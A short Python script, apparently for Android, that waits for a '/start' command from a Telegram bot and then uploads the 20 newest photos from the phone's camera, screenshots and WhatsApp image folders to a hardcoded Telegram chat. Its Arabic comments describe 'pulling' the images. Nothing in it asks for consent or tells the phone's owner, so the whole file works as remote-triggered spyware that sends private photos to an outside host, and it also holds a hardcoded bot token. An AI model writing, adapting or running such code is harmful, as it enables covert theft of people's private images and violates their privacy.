import os
import time
import requests

BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

WATCH_FOLDERS = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
]

sent_files = set()
last_update_id = 0

def check_bot_command():
    global last_update_id
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}"
    try:
        r = requests.get(url, timeout=10).json()
        if r.get("result"):
            for update in r["result"]:
                last_update_id = update["update_id"]
                msg = update.get("message", {}).get("text", "")
                if msg == "/start":
                    return True
    except: pass
    return False

def send_file(path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(path, "rb") as f:
            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f}, timeout=30)
        return True
    except: return False

def start_extraction():
    all_files = []
    for folder in WATCH_FOLDERS:
        if os.path.exists(folder):
            files = [os.path.join(folder, f) for f in os.listdir(folder) if f.lower().endswith((".jpg", ".jpeg", ".png"))]
            all_files.extend(files)
    
    all_files.sort(key=os.path.getmtime, reverse=True)
    
    count = 0
    for img in all_files:
        if count >= 20: break
        if img not in sent_files:
            if send_file(img):
                sent_files.add(img)
                count += 1
                time.sleep(2)

def main():
    while True:
        # ينتظر أمر /start من البوت
        if check_bot_command():
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "🔄 جاري سحب 20 صورة..."})
            start_extraction()
        time.sleep(5) # فحص الأوامر كل 5 ثواني

if __name__ == "__main__":
    main()
